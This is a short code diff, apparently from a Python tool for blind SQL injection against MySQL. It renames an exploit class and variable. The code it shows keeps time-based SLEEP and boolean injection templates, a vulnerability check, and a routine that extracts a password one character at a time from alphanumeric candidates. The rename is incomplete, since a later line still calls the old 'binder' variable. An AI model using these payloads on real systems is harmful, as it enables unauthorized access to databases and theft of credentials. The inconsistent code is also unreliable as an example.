@@ -52,9 +52,9 @@ template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(($request)$test,
 # Basis MySQL Boolean based template
 # template = string.Template('OR ($request)$test # ')
 
-binder = SqliExploit(MySqlConfig(), exec_request)
+helper = SqliHelper(MySqlConfig(), exec_request)
 # Is target vulnerable ?
-if(binder.check("SELECT 1")):
+if(helper.check("SELECT 1")):
     print("Target is Vulnerable")
 else:
     print("Target is not Vulnerable")
@@ -71,7 +71,7 @@ template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($reques
 
 # extract pass
 # the expected values are ASCII alphanum
-candidates = SqliExploit.string_to_candidates(string.ascii_letters + string.digits)
+candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)
 
 binder.prepare_new(candidates, template=template)
 
